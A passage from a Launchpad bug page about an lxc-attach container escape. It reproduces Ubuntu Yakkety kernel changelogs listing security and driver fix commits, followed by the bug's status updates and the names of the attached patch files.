    - [Config] CONFIG\_VIRTIO\_BLK=m, CONFIG\_VIRTIO\_NET=m

\* I2C touchpad does not work on AMD platform (LP: [#1612006](/bugs/1612006))

    - pinctrl/amd: Configure GPIO register using BIOS settings

\* guest experiencing Transmit Timeouts on CX4 (LP: [#1636330](/bugs/1636330))

    - powerpc/64: Re-fix race condition between going idle and entering guest

    - powerpc/64: Fix race condition in setting lock bit in idle/wakeup code

\* QEMU throws failure msg while booting guest with SRIOV VF (LP: [#1630554](/bugs/1630554))

    - KVM: PPC: Always select KVM\_VFIO, plus Makefile cleanup

\* [Feature] KBL - New device ID for Kabypoint(KbP) (LP: [#1591618](/bugs/1591618))

    - SAUCE: mfd: lpss: Fix Intel Kaby Lake PCH-H properties

\* hio: SSD data corruption under stress test (LP: [#1638700](/bugs/1638700))

    - SAUCE: hio: set bi\_error field to signal an I/O error on a BIO

    - SAUCE: hio: splitting bio in the entry of .make\_request\_fn

\* cleanup primary tree for linux-hwe layering issues (LP: [#1637473](/bugs/1637473))

    - [Config] switch Vcs-Git: to yakkety repository

    - [Packaging] handle both linux-lts\* and linux-hwe\* as backports

    - [Config] linux-tools-common and linux-cloud-tools-common are one per series

    - [Config] linux-source-\* is in the primary linux namespace

    - [Config] linux-tools -- always suggest the base package

\* SRU: sync zfsutils-linux and spl-linux changes to linux (LP: [#1635656](/bugs/1635656))

    - SAUCE: (noup) Update spl to 0.6.5.8-2, zfs to 0.6.5.8-0ubuntu4 (LP:

      #1635656)

\* [Feature] SKX: perf uncore PMU support (LP: [#1591810](/bugs/1591810))

    - perf/x86/intel/uncore: Add Skylake server uncore support

    - perf/x86/intel/uncore: Remove hard-coded implementation for Node ID mapping

      location

    - perf/x86/intel/uncore: Handle non-standard counter offset

\* [Feature] Purley: Memory Protection Keys (LP: [#1591804](/bugs/1591804))

    - x86/pkeys: Add fault handling for PF\_PK page fault bit

    - mm: Implement new pkey\_mprotect() system call

    - x86/pkeys: Make mprotect\_key() mask off additional vm\_flags

    - x86/pkeys: Allocation/free syscalls

    - x86: Wire up protection keys system calls

    - generic syscalls: Wire up memory protection keys syscalls

    - pkeys: Add details of system call use to Documentation/

    - x86/pkeys: Default to a restrictive init PKRU

    - x86/pkeys: Allow configuration of init\_pkru

    - x86/pkeys: Add self-tests

\* kernel invalid ...

This bug was fixed in the package linux - 4.8.0-28.30
---------------
linux (4.8.0-28.30) yakkety; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1641083
\* lxc-attach to malicious container allows access to host (LP: #1639345)
- Revert "UBUNTU: SAUCE: (noup) ptrace: being capable wrt a process requires
mapped uids/gids"
- (upstream) mm: Add a user\_ns owner to mm\_struct and fix ptrace permission
checks
\* [Feature] AVX-512 new instruction sets (avx512\_4vnniw, avx512\_4fmaps)
(LP: #1637526)
- x86/cpufeature: Add AVX512\_4VNNIW and AVX512\_4FMAPS features
\* zfs: importing zpool with vdev on zvol hangs kernel (LP: #1636517)
- SAUCE: (noup) Update zfs to 0.6.5.8-0ubuntu4.1
\* Move some device drivers build from kernel built-in to modules
(LP: #1637303)
- [Config] CONFIG\_TIGON3=m for all arches
- [Config] CONFIG\_VIRTIO\_BLK=m, CONFIG\_VIRTIO\_NET=m
\* I2C touchpad does not work on AMD platform (LP: #1612006)
- pinctrl/amd: Configure GPIO register using BIOS settings
\* guest experiencing Transmit Timeouts on CX4 (LP: #1636330)
- powerpc/64: Re-fix race condition between going idle and entering guest
- powerpc/64: Fix race condition in setting lock bit in idle/wakeup code
\* QEMU throws failure msg while booting guest with SRIOV VF (LP: #1630554)
- KVM: PPC: Always select KVM\_VFIO, plus Makefile cleanup
\* [Feature] KBL - New device ID for Kabypoint(KbP) (LP: #1591618)
- SAUCE: mfd: lpss: Fix Intel Kaby Lake PCH-H properties
\* hio: SSD data corruption under stress test (LP: #1638700)
- SAUCE: hio: set bi\_error field to signal an I/O error on a BIO
- SAUCE: hio: splitting bio in the entry of .make\_request\_fn
\* cleanup primary tree for linux-hwe layering issues (LP: #1637473)
- [Config] switch Vcs-Git: to yakkety repository
- [Packaging] handle both linux-lts\* and linux-hwe\* as backports
- [Config] linux-tools-common and linux-cloud-tools-common are one per series
- [Config] linux-source-\* is in the primary linux namespace
- [Config] linux-tools -- always suggest the base package
\* SRU: sync zfsutils-linux and spl-linux changes to linux (LP: #1635656)
- SAUCE: (noup) Update spl to 0.6.5.8-2, zfs to 0.6.5.8-0ubuntu4 (LP:
#1635656)
\* [Feature] SKX: perf uncore PMU support (LP: #1591810)
- perf/x86/intel/uncore: Add Skylake server uncore support
- perf/x86/intel/uncore: Remove hard-coded implementation for Node ID mapping
location
- perf/x86/intel/uncore: Handle non-standard counter offset
\* [Feature] Purley: Memory Protection Keys (LP: #1591804)
- x86/pkeys: Add fault handling for PF\_PK page fault bit
- mm: Implement new pkey\_mprotect() system call
- x86/pkeys: Make mprotect\_key() mask off additional vm\_flags
- x86/pkeys: Allocation/free syscalls
- x86: Wire up protection keys system calls
- generic syscalls: Wire up memory protection keys syscalls
- pkeys: Add details of system call use to Documentation/
- x86/pkeys: Default to a restrictive init PKRU
- x86/pkeys: Allow configuration of init\_pkru
- x86/pkeys: Add self-tests
\* kernel invalid opcode in intel\_powerclamp (LP: #1630774)
- SAUCE: (no-up) thermal/powerclamp: correct cpu support check
\* please include mlx5\_core modules in linux-image-generic package
(LP: #1635223)
- [Config] Include mlx5 in main package
\* [LTCTest] vfio\_pci not loaded on Ubuntu 16.10 by default (LP: #1636733)
- [Config] CONFIG\_VFIO\_PCI=y for ppc64el
\* Yakkety update to v4.8.6 stable release (LP: #1638748)
- drm/vc4: Fix races when the CS reads from render targets.
- drm/prime: Pass the right module owner through to dma\_buf\_export()
- drm/i915/backlight: setup and cache pwm alternate increment value
- drm/i915/backlight: setup backlight pwm alternate increment on backlight
enable
- drm/amdgpu: fix IB alignment for UVD
- drm/amdgpu/dce10: disable hpd on local panels
- drm/amdgpu/dce8: disable hpd on local panels
- drm/amdgpu/dce11: disable hpd on local panels
- drm/amdgpu/dce11: add missing drm\_mode\_config\_cleanup call
- drm/amdgpu: initialize the context reset\_counter in amdgpu\_ctx\_init
- drm/amdgpu: change vblank\_time's calculation method to reduce computational
error.
- drm/radeon: narrow asic\_init for virtualization
- drm/radeon/si/dpm: fix phase shedding setup
- drm/radeon: change vblank\_time's calculation method to reduce computational
error.
- drm/vmwgfx: Limit the user-space command buffer size
- drm/fsl-dcu: fix endian issue when using clk\_register\_divider
- drm/amd/powerplay: fix mclk not switching back after multi-head was disabled
- HID: add quirk for Akai MIDImix.
- drm/i915/skl: Update plane watermarks atomically during plane updates
- drm/i915: Move CRTC updating in atomic\_commit into it's own hook
- drm/i915/skl: Update DDB values atomically with wms/plane attrs
- drm/i915/skl: Don't try to update plane watermarks if they haven't changed
- drm/i915/gen9: only add the planes actually affected by ddb changes
- drm/i915/gen9: fix the WaWmMemoryReadLatency implementation
- drm/i915/gen9: minimum scanlines for Y tile is not always 4
- drm/i915/gen9: fix plane\_blocks\_per\_line on watermarks calculations
- drm/i915/gen9: fix the watermark res\_blocks value
- drm/i915: SAGV is not SKL-only, so rename a few things
- drm/i915: introduce intel\_has\_sagv()
- drm/i915/kbl: KBL also needs to run the SAGV code
- Revert "drm/i915: Check live status before reading edid"
- drm/i915: Account for TSEG size when determining 865G stolen base
- drm/i915/skl: Ensure pipes with changed wms get added to the state
- drm/i915: Allow PCH DPLL sharing regardless of DPLL\_SDVO\_HIGH\_SPEED
- drm/i915: Move long hpd handling into the hotplug work
- drm/i915: Allow DP to work w/o EDID
- drm/i915: Just clear the mmiodebug before a register access
- drm/i915: Unalias obj->phys\_handle and obj->userptr
- posix\_acl: Clear SGID bit when setting file permissions
- rt2x00usb: Fix error return code
- scsi: cxlflash: Remove the device cleanly in the system shutdown path
- genirq/generic\_chip: Add irq\_unmap callback
- coresight: Remove erroneous dma\_free\_coherent in tmc\_probe
- uio: fix dmem\_region\_start computation
- ARM: clk-imx35: fix name for ckil clk
- spi: spi-fsl-dspi: Drop extra spi\_master\_put in device remove function
- i40e: remove a stray unlock
- i40e: fix broken i40e\_config\_rss\_aq function
- mwifiex: correct aid value during tdls setup
- mwifiex: fix failed to reconnect after interface disabled/enabled
- ath10k: Add WMI\_SERVICE\_PERIODIC\_CHAN\_STAT\_SUPPORT wmi service
- ath10k: fix sending frame in management path in push txq logic
- ath10k: fix reporting channel survey data
- ath10k: fix throughput regression in multi client mode
- crypto: marvell - Don't overwrite default creq->state during initialization
- crypto: gcm - Fix IV buffer size in crypto\_gcm\_setkey
- crypto: marvell - Update transformation context for each dequeued req
- crypto: arm/ghash-ce - add missing async import/export
- crypto: ccp - Fix return value check in ccp\_dmaengine\_register()
- hwrng: omap - Only fail if pm\_runtime\_get\_sync returns < 0
- ASoC: topology: Fix error return code in soc\_tplg\_dapm\_widget\_create()
- ASoC: dapm: Fix possible uninitialized variable in snd\_soc\_dapm\_get\_volsw()
- ASoC: dapm: Fix value setting for \_ENUM\_DOUBLE MUX's second channel
- ASoC: dapm: Fix kcontrol creation for output driver widget
- ASoC: sst-bxt-rt298: fix obsoleted initializers for array
- ASoC: sst-bxt-da7219\_max98357a: fix obsoleted initializers for array
- iio: ad5755: fix off-by-one on devnr limit check
- iio: light: us5182d: Add missing error code assignment before test
- staging: android ion/hisi: fix dependencies
- staging: sm750fb: Correctly set CLOCK\_PHASE bit of display controller.
- staging: r8188eu: Fix scheduling while atomic splat
- staging: ks7010: fix wait\_for\_completion\_interruptible\_timeout return
handling
- staging: ks7010: declare private functions static
- IB/hfi1: Move iowait\_init() to priv allocate
- IB/rdmavt: Correct sparse annotation
- IB/qib: Remove qpt\_mask global
- IB/mlx5: Fix steering resource leak
- power: bq24257: Fix use of uninitialized pointer bq->charger
- dmaengine: ipu: remove bogus NO\_IRQ reference
- mm/hugetlb: check for reserved hugepages during memory offline
- mm/hugetlb: improve locking in dissolve\_free\_huge\_pages()
- drm/vmwgfx: Avoid validating views on view destruction
- s390/cio: fix accidental interrupt enabling during resume
- s390/con3270: fix use of uninitialised data
- s390/con3270: fix insufficient space padding
- clk: bcm2835: Skip PLLC clocks when deciding on a new clock parent
- clk: gcc-msm8996: Fix pcie 2 pipe register offset
- clk: qcom: select GDSC for msm8996 gcc and mmcc
- clk: qoriq: fix a register offset error
- clk: Return errors from clk providers in \_\_of\_clk\_get\_from\_provider()
- clk: core: Force setting the phase delay when no change
- clk: divider: Fix clk\_divider\_round\_rate() to use clk\_readl()
- perf data: Fix building in 32 bit platform with libbabeltrace
- perf hists browser: Fix event group display
- perf powerpc: Fix build-test failure
- perf ui/tui: Reset output width for hierarchy
- perf ui/stdio: Always reset output width for hierarchy
- perf symbols: Check symbol\_conf.allow\_aliases for kallsyms loading too
- perf symbols: Fixup symbol sizes before picking best ones
- iwlwifi: check for valid ethernet address provided by OEM
- iwlwifi: mvm: fix pending frames tracking on tx resp
- iwlwifi: mvm: call a different txq\_enable function
- iwlwifi: mvm: free reserved queue on STA removal
- iwlwifi: mvm: support BAR in reorder buffer
- iwlwifi: mvm: disable P2P queue on mac context release
- iwlwifi: mvm: bail out if CTDP start operation fails
- ARM: dts: sun9i: Add missing #interrupt-cells to R\_PIO pinctrl device node
- pinctrl: qcom: fix masking of pinmux functions
- mpt3sas: Don't spam logs if logging level is 0
- powerpc: Always restore FPU/VEC/VSX if hardware transactional memory in use
- powerpc: Add check\_if\_tm\_restore\_required() to giveup\_all()
- powerpc/nvram: Fix an incorrect partition merge
- powerpc: Fix usage of \_PAGE\_RO in hugepage
- ARM: pxa: pxa\_cplds: fix interrupt handling
- ARM: pxa: fix GPIO double shifts
- ARM: dts: NSP: Correct RAM amount for BCM958625HR board
- ARM: dts: fix RealView EB SMSC ethernet version
- ARM: dts: omap3: overo: add missing unit name for lcd35 display
- PCI: rcar: Fix pci\_remap\_iospace() failure path
- PCI: aardvark: Fix pci\_remap\_iospace() failure path
- PCI: generic: Fix pci\_remap\_iospace() failure path
- PCI: versatile: Fix pci\_remap\_iospace() failure path
- PCI: designware: Fix pci\_remap\_iospace() failure path
- PCI: tegra: Fix pci\_remap\_iospace() failure path
- libnvdimm: clear the internal poison\_list when clearing badblocks
- Linux 4.8.6
\* Yakkety update to v4.8.5 stable release (LP: #1637520)
- gpio: mpc8xxx: Correct irq handler function
- mei: fix return value on disconnection
- mei: me: add kaby point device ids
- regulator: tps65910: Work around silicon erratum SWCZ010
- clk: imx6: initialize GPU clocks
- clk: imx6: fix i.MX6DL clock tree to reflect reality
- spi: spidev\_test: Fix buffer overflow in unescape()
- PM / devfreq: event: remove duplicate devfreq\_event\_get\_drvdata()
- ath10k: fix copy engine 5 destination ring stuck
- rtlwifi: Fix missing country code for Great Britain
- mmc: block: don't use CMD23 with very old MMC cards
- mmc: sdhci: cast unsigned int to unsigned long long to avoid unexpeted error
- PCI: Mark Atheros AR9580 to avoid bus reset
- PCI: tegra: Fix argument order in tegra\_pcie\_phy\_disable()
- platform: don't return 0 from platform\_get\_irq[\_byname]() on error
- cpufreq: ti: Use generic platdev driver
- cpufreq: conservative: Fix next frequency selection
- cpufreq: skip invalid entries when searching the frequency
- cpufreq: intel\_pstate: Fix unsafe HWP MSR access
- cpufreq: fix overflow in cpufreq\_table\_find\_index\_dl()
- parisc: Increase KERNEL\_INITIAL\_SIZE for 32-bit SMP kernels
- parisc: Fix self-detected CPU stall warnings on Mako machines
- parisc: Fix kernel memory layout regarding position of \_\_gp
- parisc: Increase initial kernel mapping size
- pstore/ramoops: fixup driver removal
- pstore/core: drop cmpxchg based updates
- pstore/ram: Use memcpy\_toio instead of memcpy
- pstore/ram: Use memcpy\_fromio() to save old buffer
- perf intel-pt: Fix snapshot overlap detection decoder errors
- perf intel-pt: Fix estimated timestamps for cycle-accurate mode
- perf intel-pt: Fix MTC timestamp calculation for large MTC periods
- dm: mark request\_queue dead before destroying the DM device
- dm: return correct error code in dm\_resume()'s retry loop
- dm rq: take request\_queue lock while clearing QUEUE\_FLAG\_STOPPED
- dm mpath: check if path's request\_queue is dying in activate\_path()
- dm crypt: fix crash on exit
- powerpc/xmon: Don't use ld on 32-bit
- powerpc/vdso64: Use double word compare on pointers
- powerpc/powernv: Pass CPU-endian PE number to opal\_pci\_eeh\_freeze\_clear()
- powerpc/eeh: Null check uses of eeh\_pe\_bus\_get
- powerpc/powernv: Use CPU-endian hub diag-data type in
pnv\_eeh\_get\_and\_dump\_hub\_diag()
- powerpc/powernv: Use CPU-endian PEST in pnv\_pci\_dump\_p7ioc\_diag\_data()
- powerpc/mm: Update FORCE\_MAX\_ZONEORDER range to allow hugetlb w/4K
- powerpc/mm/hash64: Fix might\_have\_hea() check
- IB/srp: Fix infinite loop when FMR sg[0].offset != 0
- IB/core: correctly handle rdma\_rw\_init\_mrs() failure
- ubi: Deal with interrupted erasures in WL
- zfcp: fix fc\_host port\_type with NPIV
- zfcp: fix ELS/GS request&response length for hardware data router
- zfcp: close window with unblocked rport during rport gone
- zfcp: retain trace level for SCSI and HBA FSF response records
- zfcp: restore: Dont use 0 to indicate invalid LUN in rec trace
- zfcp: trace on request for open and close of WKA port
- zfcp: restore tracing of handle for port and LUN with HBA records
- zfcp: fix D\_ID field with actual value on tracing SAN responses
- zfcp: fix payload trace length for SAN request&response
- zfcp: trace full payload of all SAN records (req,resp,iels)
- scsi: zfcp: spin\_lock\_irqsave() is not nestable
- fbdev/efifb: Fix 16 color palette entry calculation
- ovl: Fix info leak in ovl\_lookup\_temp()
- ovl: copy\_up\_xattr(): use strnlen
- mb86a20s: fix the locking logic
- mb86a20s: fix demod settings
- cx231xx: don't return error on success
- cx231xx: fix GPIOs for Pixelview SBTVD hybrid
- cx231xx: can't proceed if I2C bus register fails
- ALSA: hda - Fix a failure of micmute led when having multi adcs
- MIPS: Fix -mabi=64 build of vdso.lds
- MIPS: ptrace: Fix regs\_return\_value for kernel context
- Input: i8042 - skip selftest on ASUS laptops
- Input: elantech - force needed quirks on Fujitsu H760
- Input: elantech - add Fujitsu Lifebook E556 to force crc\_enabled
- sunrpc: fix write space race causing stalls
- NFSD: fix corruption in notifier registration
- NFS: Fix inode corruption in nfs\_prime\_dcache()
- NFSv4: Don't report revoked delegations as valid in nfs\_have\_delegation()
- NFSv4: nfs4\_copy\_delegation\_stateid() must fail if the delegation is invalid
- NFSv4: Open state recovery must account for file permission changes
- NFSv4.2: Fix a reference leak in nfs42\_proc\_layoutstats\_generic
- pnfs/blocklayout: fix last\_write\_offset incorrectly set to page boundary
- scsi: Fix use-after-free
- watchdog: rt2880\_wdt: Remove assignment of dev pointer
- watchdog: mt7621\_wdt: Remove assignment of dev pointer
- metag: Only define atomic\_dec\_if\_positive conditionally
- soc/fsl/qe: fix gpio save\_regs functions
- soc/fsl/qe: fix Oops on CPM1 (and likely CPM2)
- arm64: KVM: VHE: reset PSTATE.PAN on entry to EL2
- arc: don't leak bits of kernel stack into coredump
- fs/super.c: fix race between freeze\_super() and thaw\_super()
- cifs: Limit the overall credit acquired
- fs/cifs: keep guid when assigning fid to fileinfo
- Clarify locking of cifs file and tcon structures and make more granular
- Display number of credits available
- Set previous session id correctly on SMB3 reconnect
- SMB3: GUIDs should be constructed as random but valid uuids
- Do not send SMB3 SET\_INFO request if nothing is changing
- Cleanup missing frees on some ioctls
- blkcg: Unlock blkcg\_pol\_mutex only once when cpd == NULL
- x86/e820: Don't merge consecutive E820\_PRAM ranges
- kvm: x86: memset whole irq\_eoi
- x86/platform/UV: Fix support for EFI\_OLD\_MEMMAP after BIOS callback updates
- x86/boot/smp: Don't try to poke disabled/non-existent APIC
- pinctrl: intel: Only restore pins that are used by the driver
- pinctrl: baytrail: Fix lockdep
- sched/fair: Fix incorrect task group ->load\_avg
- sched/fair: Fix min\_vruntime tracking
- irqchip/gicv3: Handle loop timeout proper
- irqchip/eznps: Acknowledge NPS\_IPI before calling the handler
- irqchip/gic-v3-its: Fix entry size mask for GITS\_BASER
- cxl: Prevent adapter reset if an active context exists
- isofs: Do not return EACCES for unknown filesystems
- memstick: rtsx\_usb\_ms: Runtime resume the device when polling for cards
- memstick: rtsx\_usb\_ms: Manage runtime PM when accessing the device
- arm64: swp emulation: bound LL/SC retries before rescheduling
- arm64: kaslr: fix breakage with CONFIG\_MODVERSIONS=y
- arm64: percpu: rewrite ll/sc loops in assembly
- arm64: kernel: Init MDCR\_EL2 even in the absence of a PMU
- arm64: Cortex-A53 errata workaround: check for kernel addresses
- arm64: KVM: Take S1 walks into account when determining S2 write faults
- ceph: fix error handling in ceph\_read\_iter
- powerpc/mm: Prevent unlikely crash in copro\_calculate\_slb()
- mmc: core: Annotate cmd\_hdr as \_\_le32
- mmc: core: switch to 1V8 or 1V2 for hs400es mode
- mmc: rtsx\_usb\_sdmmc: Avoid keeping the device runtime resumed when unused
- mmc: rtsx\_usb\_sdmmc: Handle runtime PM while changing the led
- KVM: s390: reject invalid modes for runtime instrumentation
- fscrypto: make XTS tweak initialization endian-independent
- fscrypto: lock inode while setting encryption policy
- ext4: do not advertise encryption support when disabled
- jbd2: fix incorrect unlock on j\_list\_lock
- ubifs: Fix xattr\_names length in exit paths
- target/tcm\_fc: use CPU affinity for responses
- target: Re-add missing SCF\_ACK\_KREF assignment in v4.1.y
- target: Make EXTENDED\_COPY 0xe4 failure return COPY TARGET DEVICE NOT
REACHABLE
- target: Don't override EXTENDED\_COPY xcopy\_pt\_cmd SCSI status code
- Revert "target: Fix residual overflow handling in
target\_complete\_cmd\_with\_length"
- Linux 4.8.5
\* Yakkety update to v4.8.4 stable release (LP: #1637517)
- serial: imx: Fix DCD reading
- BUG: atmel\_serial: Interrupts not disabled on close
- serial: 8250\_dw: Check the data->pclk when get apb\_pclk
- serial: 8250\_port: fix runtime PM use in \_\_do\_stop\_tx\_rs485()
- ARCv2: intc: Use kflag if STATUS32.IE must be reset
- ARCv2: fix local\_save\_flags
- debugfs: introduce a public file\_operations accessor
- b43: fix debugfs crash
- b43legacy: fix debugfs crash
- carl9170: fix debugfs crashes
- Btrfs: fix free space tree bitmaps on big-endian systems
- Btrfs: fix mount -o clear\_cache,space\_cache=v2
- Btrfs: catch invalid free space trees
- btrfs: assign error values to the correct bio structs
- mei: amthif: fix deadlock in initialization during a reset
- drivers: base: dma-mapping: page align the size when unmap\_kernel\_range
- IB/hfi1: Fix defered ack race with qp destroy
- clk: mvebu: fix setting unwanted flags in CP110 gate clock
- clk: mvebu: dynamically allocate resources in Armada CP110 system controller
- fuse: listxattr: verify xattr list
- fuse: invalidate dir dentry after chmod
- fuse: fix killing s[ug]id in setattr
- mm: filemap: fix mapping->nrpages double accounting in fuse
- i40e: avoid NULL pointer dereference and recursive errors on early PCI error
- xfs: change mailing list address
- mm: filemap: don't plant shadow entries without radix tree node
- brcmfmac: fix pmksa->bssid usage
- brcmfmac: fix memory leak in brcmf\_fill\_bss\_param
- brcmfmac: use correct skb freeing helper when deleting flowring
- ASoC: nau8825: fix bug in FLL parameter
- ASoC: Intel: Atom: add a missing star in a memcpy call
- reiserfs: Unlock superblock before calling reiserfs\_quota\_on\_mount()
- async\_pq\_val: fix DMA memory leak
- scsi: arcmsr: Simplify user\_len checking
- ipc/sem.c: fix complex\_count vs. simple op race
- mm/hugetlb: fix memory offline with hugepage size > memory block size
- vfs,mm: fix a dead loop in truncate\_inode\_pages\_range()
- jbd2: fix lockdep annotation in add\_transaction\_credits()
- ext4: enforce online defrag restriction for encrypted files
- ext4: reinforce check of i\_dtime when clearing high fields of uid and gid
- ext4: bugfix for mmaped pages in mpage\_release\_unused\_pages()
- ext4: fix memory leak in ext4\_insert\_range()
- ext4: fix memory leak when symlink decryption fails
- ext4: allow DAX writeback for hole punch
- ext4: release bh in make\_indexed\_dir
- ext4: unmap metadata when zeroing blocks
- dlm: free workqueues after the connections
- vfs: move permission checking into notify\_change() for utimes(NULL)
- cachefiles: Fix attempt to read i\_blocks after deleting file [ver #2]
- drm: virtio: reinstate drm\_virtio\_set\_busid()
- acpi, nfit: check for the correct event code in notifications
- cfq: fix starvation of asynchronous writes
- Linux 4.8.4
\* Yakkety update to v4.8.3 stable release (LP: #1637512)
- v4l: rcar-fcp: Don't force users to check for disabled FCP support
- scsi: configure runtime pm before calling device\_add in
scsi\_add\_host\_with\_dma
- Make \_\_xfs\_xattr\_put\_listen preperly report errors.
- Linux 4.8.3
\* KVM: PPC: Book3S HV: Migrate pinned pages out of CMA (LP: #1632045)
- KVM: PPC: Book3S HV: Migrate pinned pages out of CMA
\* unexpectedly large memory usage of mounted snaps (LP: #1636847)
- [Config] switch squashfs to single threaded decode
\* Fix bugs under virtual scsi server driver for Power (LP: #1621088)
- target/user: Use sense\_reason\_t in tcmu\_queue\_cmd\_ring
- target/user: Return an error if cmd data size is too large
- target/user: Fix comments to not refer to data ring
\* ISST-LTE:pVM nvme 0000:a0:00.0: iommu\_alloc failed on NVMe card
(LP: #1633128)
- dma-mapping: introduce the DMA\_ATTR\_NO\_WARN attribute
- powerpc: implement the DMA\_ATTR\_NO\_WARN attribute
- nvme: use the DMA\_ATTR\_NO\_WARN attribute
\* arm64: kprobes disabled (LP: #1634271)
- [Config] Enable KPROBES on arm64
\* Bad page state in process genwqe\_gunzip pfn:3c275 in the genwqe device
driver (LP: #1559194)
- SAUCE: (noup) Bad page state in process genwqe\_gunzip pfn:3c275 in the
genwqe device driver
\* CVE-2016-7425
- scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()
\* Add ipvlan module to 16.04 kernel (LP: #1634705)
- [Config] Add ipvlan to the generic inclusion list
\* hio Ubuntu sauce driver needs porting to 4.8 (LP: #1635594)
- SAUCE: import Huawei ES3000\_V2 (2.1.0.23)
- SAUCE: hio: bio\_endio() no longer takes errors arg
- SAUCE: hio: blk\_queue make\_request\_fn now returns a blk\_qc\_t
- SAUCE: hio: use alloc\_cpumask\_var to avoid -Wframe-larger-than
- SAUCE: hio: fix mask maybe-uninitialized warning
- SAUCE: hio: port to v4.8 base
- [config] enable CONFIG\_HIO (Huawei ES3000\_V2 PCIe SSD driver)
- SAUCE: hio: Makefile and Kconfig
- [Config] Enforce CONFIG\_HIO
\* Yakkety update to v4.8.2 stable release (LP: #1633973)
- usb: storage: fix runtime pm issue in usb\_stor\_probe2
- timekeeping: Fix \_\_ktime\_get\_fast\_ns() regression
- usb: dwc3: fix Clear Stall EP command failure
- phy: sun4i-usb: Use spinlock to guard phyctl register access
- ALSA: ali5451: Fix out-of-bound position reporting
- ALSA: usb-audio: Extend DragonFly dB scale quirk to cover other variants
- ALSA: usb-line6: use the same declaration as definition in header for MIDI
manufacturer ID
- mfd: rtsx\_usb: Avoid setting ucr->current\_sg.status
- mfd: atmel-hlcdc: Do not sleep in atomic context
- mfd: 88pm80x: Double shifting bug in suspend/resume
- mfd: wm8350-i2c: Make sure the i2c regmap functions are compiled
- xen/x86: Update topology map for PV VCPUs
- KVM: PPC: Book3s PR: Allow access to unprivileged MMCR2 register
- KVM: MIPS: Drop other CPU ASIDs on guest MMU changes
- KVM: arm64: Require in-kernel irqchip for PMU support
- KVM: arm/arm64: vgic: Don't flush/sync without a working vgic
- KVM: PPC: BookE: Fix a sanity check
- arm64: fix dump\_backtrace/unwind\_frame with NULL tsk
- x86/boot: Fix kdump, cleanup aborted E820\_PRAM max\_pfn manipulation
- x86/irq: Prevent force migration of irqs which are not in the vector domain
- x86/pkeys: Make protection keys an "eager" feature
- x86/cpu: Rename Merrifield2 to Moorefield
- x86/platform/intel-mid: Add Intel Penwell to ID table
- x86/platform/intel-mid: Keep SRAM powered on at boot
- x86/apic: Get rid of apic\_version[] array
- arch/x86: Handle non enumerated CPU after physical hotplug
- x86/mm/pkeys: Do not skip PKRU register if debug registers are not used
- x86/dumpstack: Fix x86\_32 kernel\_stack\_pointer() previous stack access
- ARM: fix delays
- ARM: dts: mvebu: armada-390: add missing compatibility string and bracket
- ARM: dts: MSM8064 remove flags from SPMI/MPP IRQs
- ARM: dts: MSM8660 remove flags from SPMI/MPP IRQs
- ARM: cpuidle: Fix error return code
- Bluetooth: Add a new 04ca:3011 QCA\_ROME device
- ima: use file\_dentry()
- tpm: fix a race condition in tpm2\_unseal\_trusted()
- tpm\_crb: fix crb\_req\_canceled behavior
- Linux 4.8.2
\* Bluetooth 04ca:3011 [Asus Aspire V3-371] doesn't work (LP: #1535802)
- Bluetooth: Add a new 04ca:3011 QCA\_ROME device
-- Luis Henriques <luis.henriques@canonical.com> Fri, 11 Nov 2016 10:30:54 +0000

| Changed in linux (Ubuntu Yakkety): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-12-06: |  |  | [#66](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/66) |
| --- | --- | --- | --- |

This bug was fixed in the package linux - 4.8.0-30.32

---------------

linux (4.8.0-30.32) yakkety; urgency=low

\* CVE-2016-8655 (LP: [#1646318](/bugs/1646318))

    - packet: fix race condition in packet\_set\_ring

-- Brad Figg <email address hidden> Thu, 01 Dec 2016 08:02:53 -0800

This bug was fixed in the package linux - 4.8.0-30.32
---------------
linux (4.8.0-30.32) yakkety; urgency=low
\* CVE-2016-8655 (LP: #1646318)
- packet: fix race condition in packet\_set\_ring
-- Brad Figg <brad.figg@canonical.com> Thu, 01 Dec 2016 08:02:53 -0800

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | Triaged → Fix Released |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/lxc/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [0001-attach-prevent-stealing-proc-fd-by-container.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774507/%2Bfiles/0001-attach-prevent-stealing-proc-fd-by-container.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774507 "Change patch details")
* [attach: do not send procfd to attached process](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774931/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774931 "Change patch details")
* [0001-attach-do-not-send-procfd-to-attached-process.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4777815/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4777815 "Change patch details")
* [LXC patch for master.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779383/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779383 "Change patch details")
